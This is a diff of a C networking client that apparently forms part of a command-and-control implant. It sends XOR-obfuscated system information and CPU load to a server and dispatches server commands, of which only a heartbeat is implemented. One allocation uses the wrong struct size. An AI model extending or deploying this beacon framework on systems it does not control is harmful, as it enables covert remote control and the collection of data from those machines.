@@ -22,7 +22,9 @@
 #include <stdbool.h>
 #include <string.h>
 #include <unistd.h>
+#include "../crypt.h"
 #include "../net.h"
+#include "../defs.h"
 
 bool net_client(char *host, int port){
   /*
@@ -45,40 +47,72 @@ bool net_client(char *host, int port){
   server.sin_addr.s_addr = inet_addr(host);
   server.sin_port        = htons(port);
 
+  // server beacon setup
+  net_server_beacon_t *p_net_server_beacon = malloc(sizeof(net_client_beacon_t));
+  
   // client beacon setup
   net_client_beacon_t *p_net_client_beacon = malloc(sizeof(net_client_beacon_t));
-  p_net_client_beacon->xor_key = 10;
+  p_net_client_beacon->xor_key = DEFS_XOR_KEY;
   p_net_client_beacon->sysinfo = *sys_info();
-  
+
+  crypt_encrypt_xor((void *)p_net_client_beacon,
+                    sizeof(net_client_beacon_t),
+                    p_net_client_beacon->xor_key);
   while(true){
     sock_fd = socket(AF_INET, SOCK_STREAM, 0);
     if (sock_fd < 0){
       fprintf(stderr, "[x] failed to create socket\n");
-      sleep(NET_CLIENT_SLEEP);
-      continue;
+      return false;
     }
 
     if (connect(sock_fd, (struct sockaddr *)&server, sizeof(server)) < 0){
-      fprintf(stderr, "[x] failed to connect to server\n");
+      fprintf(stderr, "[-] failed to connect to server retrying in %ds\n", NET_CLIENT_SLEEP);
       close(sock_fd);
       sleep(NET_CLIENT_SLEEP);
       continue;
     } else{
-      printf("[+] connected to server\n");
+      printf("[+] connected to %s:%d\n",
+             inet_ntoa(server.sin_addr),
+             ntohs(server.sin_port));
     }
 
     while(true){
       p_net_client_beacon->sysinfo.cpu_usage = sys_load_average();
+      crypt_encrypt_xor_all((void *)&p_net_client_beacon->sysinfo.cpu_usage,
+                        sizeof(int),
+                        DEFS_XOR_KEY);
       if (send(sock_fd, p_net_client_beacon, sizeof(net_client_beacon_t), 0) < 0){
-        fprintf(stderr, "[x] failed to send data to server\n");
+        fprintf(stderr,
+                "[-] failed to send data to %s:%d\n",
+                inet_ntoa(server.sin_addr),
+                ntohs(server.sin_port));
         break;
       }
-      if (recv(sock_fd, response, sizeof(response), 0) <= 0){
-        fprintf(stderr, "[x] failed to receive server data\n");
+      if (recv(sock_fd, p_net_server_beacon, sizeof(net_server_beacon_t), 0) <= 0){
+        fprintf(stderr,
+                "[-] failed to received data from %s:%d\n",
+                inet_ntoa(server.sin_addr),
+                ntohs(server.sin_port));
         break;
       } else{
-        printf("%s\n", response);
-        memset(response, 0, sizeof(response));
+        crypt_decrypt_xor((void *)p_net_server_beacon,
+                          sizeof(net_server_beacon_t),
+                          DEFS_XOR_KEY);
+        if (p_net_server_beacon->status == true){
+          // command handler
+          switch(p_net_server_beacon->command){
+          case NET_SERVER_CMD_BEACON:
+            printf("[+] %s:%d OK\n",
+                   inet_ntoa(server.sin_addr),
+                   ntohs(server.sin_port));
+            break;
+          default:
+            printf("[-] response data corrupt or command not supported\n");
+            break;
+          }
+        } else{
+          fprintf(stderr, "[-] beacon status failed\n");
+        }
       }
       sleep(NET_CLIENT_SLEEP);
     }
